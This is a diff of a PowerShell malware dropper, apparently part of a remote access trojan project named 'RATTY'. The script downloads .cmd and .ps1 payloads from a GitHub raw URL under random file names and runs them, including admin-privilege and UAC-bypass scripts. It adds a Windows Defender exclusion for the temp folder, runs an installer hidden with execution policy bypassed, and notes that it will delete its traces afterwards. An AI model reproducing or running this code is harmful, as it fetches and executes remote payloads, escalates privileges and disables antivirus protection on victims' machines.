@@ -6,7 +6,7 @@ $uXqvmLVgcR = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 [System.Net.ServicePointManager]::SecurityProtocol = $uXqvmLVgcR
 Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resources/getadpriv.cmd" -OutFile "bGnQSfviwu.cmd"
 Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/resources/UAC.ps1" -OutFile "fyvQVwBMgE.ps1"
-"bGnQSfviwu.cmd"|cmd;./fyvQVwBMgE.ps1
+./fyvQVwBMgE.ps1;"bGnQSfviwu.cmd"|cmd
 # disable UACMOM
 Install-Module -Name PSWindowUpdate -Force
 Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resources/installer.ps1" -OutFile "qjhOmDleBS.ps1"
@@ -18,6 +18,6 @@ Add-MpPreference -ExclusionPath "$env:temp"
 
 
 
-"Powershell.exe -executionpolicy Bypass -windowstyle hidden -File  qjhOmDleBS.ps1"| cmd
+Powershell.exe -executionpolicy Bypass -windowstyle hidden -File  qjhOmDleBS.ps1
 #after finishing the payload we shall delete every thing
 
